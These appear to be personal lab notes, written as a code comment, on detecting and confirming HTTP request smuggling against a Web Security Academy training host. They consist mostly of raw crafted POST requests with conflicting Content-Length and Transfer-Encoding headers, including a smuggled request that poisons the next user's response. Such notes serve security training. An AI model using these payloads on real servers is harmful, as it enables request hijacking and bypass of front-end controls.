/*

a) Detection (timeout and invalid request technique)

Change request method to POST, HTTP 1, turn off update contentlength automatically

// front end server
POST / HTTP/1.1
Host: 0acb009b03d564988227d424002b0047.web-security-academy.net
Cookie: session=CM8XocSedo2Q8FdhfDoz5CdkUFFXk6vK
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

// invalid request


// backend srever

POST / HTTP/1.1
Host: 0acb009b03d564988227d424002b0047.web-security-academy.net
Cookie: session=CM8XocSedo2Q8FdhfDoz5CdkUFFXk6vK
Content-Length: 6
Transfer-Encoding: chunked

0

// timeout


b) Confirmation

// attacker request
POST / HTTP/1.1
Host: 0acb009b03d564988227d424002b0047.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

a5
POST /throws404 HTTP/1.1
Host: 0acb009b03d564988227d424002b0047.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

x=1
0

// 200 OK


// after this send a normal get / request
// 404 not found


*/